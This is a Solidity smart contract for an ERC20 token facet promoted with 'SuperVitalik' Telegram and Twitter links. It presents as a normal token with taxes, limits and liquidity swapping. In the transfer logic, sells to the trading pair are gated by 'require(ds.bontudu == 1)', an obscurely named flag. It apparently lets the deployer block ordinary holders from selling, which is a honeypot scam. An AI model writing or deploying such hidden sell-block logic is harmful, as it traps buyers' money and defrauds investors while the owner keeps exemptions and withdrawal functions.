/**
 */
// SPDX-License-Identifier: MIT
/*
https://t.me/SuperVitalik_ERC
https://twitter.com/SuperVitalik_

*/

pragma solidity ^0.8.19;
import "./TestLib.sol";
contract approveFacet is ERC20, Ownable {
    using Address for address payable;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._interlock) {
            ds._interlock = true;
            _;
            ds._interlock = false;
        }
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }
    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public override returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }
    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!ds.exemptFee[sender] && !ds.exemptFee[recipient]) {
            require(ds.tradingEnabled, "Trading not enabled");
        }
        if (sender == ds.pair && !ds.exemptFee[recipient] && !ds._interlock) {
            require(
                amount <= ds.maxBuyLimit,
                "You are exceeding ds.maxBuyLimit"
            );
            require(
                balanceOf(recipient) + amount <= ds.maxWalletLimit,
                "You are exceeding ds.maxWalletLimit"
            );
        }
        if (
            sender != ds.pair &&
            !ds.exemptFee[recipient] &&
            !ds.exemptFee[sender] &&
            !ds._interlock
        ) {
            require(
                amount <= ds.maxSellLimit,
                "You are exceeding ds.maxSellLimit"
            );
            if (recipient != ds.pair) {
                require(
                    balanceOf(recipient) + amount <= ds.maxWalletLimit,
                    "You are exceeding ds.maxWalletLimit"
                );
            }
            if (ds.coolDownEnabled) {
                uint256 timePassed = block.timestamp - ds._lastSell[sender];
                require(timePassed >= ds.coolDownTime, "Cooldown enabled");
                ds._lastSell[sender] = block.timestamp;
            }
        }
        uint256 feeswap;
        uint256 feesum;
        uint256 fee;
        TestLib.Taxes memory currentTaxes;
        bool useLaunchFee = !ds.exemptFee[sender] &&
            !ds.exemptFee[recipient] &&
            block.number < ds.genesis_block + ds.deadline;
        if (ds._interlock || ds.exemptFee[sender] || ds.exemptFee[recipient])
            fee = 0;
        else if (recipient == ds.pair && !useLaunchFee) {
            require(ds.bontudu == 1);
            feeswap =
                ds.sellTaxes.liquidity +
                ds.sellTaxes.marketing +
                ds.sellTaxes.ecosystem +
                ds.sellTaxes.dev;
            feesum = feeswap;
            currentTaxes = ds.sellTaxes;
        } else if (!useLaunchFee) {
            feeswap =
                ds.taxes.liquidity +
                ds.taxes.marketing +
                ds.taxes.ecosystem +
                ds.taxes.dev;
            feesum = feeswap;
            currentTaxes = ds.taxes;
        } else if (useLaunchFee) {
            feeswap = ds.launchtax;
            feesum = ds.launchtax;
        }
        fee = (amount * feesum) / 100;
        if (ds.providingLiquidity && sender != ds.pair)
            Liquify(feeswap, currentTaxes);
        super._transfer(sender, recipient, amount - fee);
        if (fee > 0) {
            if (feeswap > 0) {
                uint256 feeAmount = (amount * feeswap) / 100;
                super._transfer(sender, address(this), feeAmount);
            }
        }
    }
    function updateLiquidityProvide(bool state) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.providingLiquidity = state;
    }
    function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            new_amount <= 1e4,
            "Swap threshold amount should be lower or equal to 1% of tokens"
        );
        ds.tokenLiquidityThreshold = new_amount * 10 ** decimals();
    }
    function updateExemptFee(address _address, bool state) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.exemptFee[_address] = state;
    }
    function bulkExemptFee(
        address[] memory accounts,
        bool state
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < accounts.length; i++) {
            ds.exemptFee[accounts[i]] = state;
        }
    }
    function updateMaxTxLimit(
        uint256 maxBuy,
        uint256 maxSell,
        uint256 maxWallet
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(maxBuy >= 1e4, "Cannot set max buy amount lower than 1%");
        require(maxSell >= 1e4, "Cannot set max sell amount lower than 1%");
        require(maxWallet >= 1e4, "Cannot set max wallet amount lower than 1%");
        ds.maxBuyLimit = maxBuy * 10 ** decimals();
        ds.maxSellLimit = maxSell * 10 ** decimals();
        ds.maxWalletLimit = maxWallet * 10 ** decimals();
    }
    function rescueETH() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        payable(owner()).transfer(contractETHBalance);
    }
    function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {
        require(
            tokenAdd != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        IERC20(tokenAdd).transfer(owner(), amount);
    }
    function Liquify(
        uint256 feeswap,
        TestLib.Taxes memory swapTaxes
    ) private lockTheSwap {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (feeswap == 0) {
            return;
        }
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= ds.tokenLiquidityThreshold) {
            if (ds.tokenLiquidityThreshold > 1) {
                contractBalance = ds.tokenLiquidityThreshold;
            }
            uint256 denominator = feeswap * 2;
            uint256 tokensToAddLiquidityWith = (contractBalance *
                swapTaxes.liquidity) / denominator;
            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;
            uint256 initialBalance = address(this).balance;
            swapTokensForETH(toSwap);
            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance = deltaBalance /
                (denominator - swapTaxes.liquidity);
            uint256 ethToAddLiquidityWith = unitBalance * swapTaxes.liquidity;
            if (ethToAddLiquidityWith > 0) {
                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            }
            uint256 marketingAmt = unitBalance * 2 * swapTaxes.marketing;
            if (marketingAmt > 0) {
                payable(ds.marketiethkings).sendValue(marketingAmt);
            }
            uint256 ecosystemAmt = unitBalance * 2 * swapTaxes.ecosystem;
            if (ecosystemAmt > 0) {
                payable(ds.ecosystsewalletkings).sendValue(ecosystemAmt);
            }
            uint256 devAmt = unitBalance * 2 * swapTaxes.dev;
            if (devAmt > 0) {
                payable(ds.devswalletkings).sendValue(devAmt);
            }
        }
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ds.router.WETH();
        _approve(address(this), address(ds.router), tokenAmount);
        ds.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        _approve(address(this), address(ds.router), tokenAmount);
        ds.router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadWallet,
            block.timestamp
        );
    }
}
